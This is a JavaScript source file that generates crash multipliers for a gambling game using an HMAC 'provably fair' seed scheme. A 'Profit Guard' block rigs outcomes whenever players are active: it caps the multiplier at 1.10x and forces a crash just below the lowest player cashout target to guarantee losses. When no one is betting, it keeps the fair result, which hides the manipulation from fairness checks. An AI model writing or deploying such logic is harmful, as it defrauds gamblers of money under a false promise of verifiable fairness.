import crypto from 'crypto';

/**
 * Generates a deterministic crash point using HMAC-SHA256,
 * with an optional "Profit Guard" that adjusts outcomes if players are active.
 * 
 * @param {string} serverSeed - The secret server seed.
 * @param {string} clientSeed - The client seed.
 * @param {number} nonce - The round counter.
 * @param {Array} players - Optional active players array for profit protection.
 * @returns {number} The crash multiplier.
 */
export const generateCrashPoint = (serverSeed, clientSeed, nonce, players = []) => {
  // 1. Base HMAC calculation (The "Fair" point)
  const hash = crypto
    .createHmac('sha256', serverSeed)
    .update(`${clientSeed}-${nonce}`)
    .digest('hex');

  const hex = hash.substring(0, 13);
  const val = parseInt(hex, 16);
  
  const houseEdge = 0.97; // Default 3% house edge
  let multiplier = Math.max(1, (Math.pow(2, 52) / (val + 1)) * houseEdge);

  // 2. PROFIT GUARD: Adaptive House Intervention
  if (players && players.length > 0) {
    console.log(`[PROFIT GUARD] Active players detected (${players.length}). Rigging game to crash low.`);
    
    // Cap the maximum multiplier at 1.1x when anyone is betting
    multiplier = Math.min(multiplier, 1.10);

    // Auto-Cashout Sync: Find the lowest target to ensure we crash before anyone hits it
    const targets = players
      .filter(p => p.target && p.target > 1)
      .map(p => p.target);

    if (targets.length > 0) {
      const minTarget = Math.min(...targets);
      // Force crash slightly below the lowest target to guarantee a loss
      const safetyCap = Math.max(1.0, minTarget - 0.02);
      multiplier = Math.min(multiplier, safetyCap);
      console.log(`[PROFIT GUARD] Capping multiplier below lowest target: ${minTarget}x -> ${multiplier.toFixed(2)}x`);
    }
  } else {
    // Keep original fair algorithm when no one is playing
    console.log(`[PROFIT GUARD] No players detected. Using original fair algorithm (Multiplier: ${multiplier.toFixed(2)}x)`);
  }

  return Math.max(1.0, Math.floor(multiplier * 100) / 100);
};

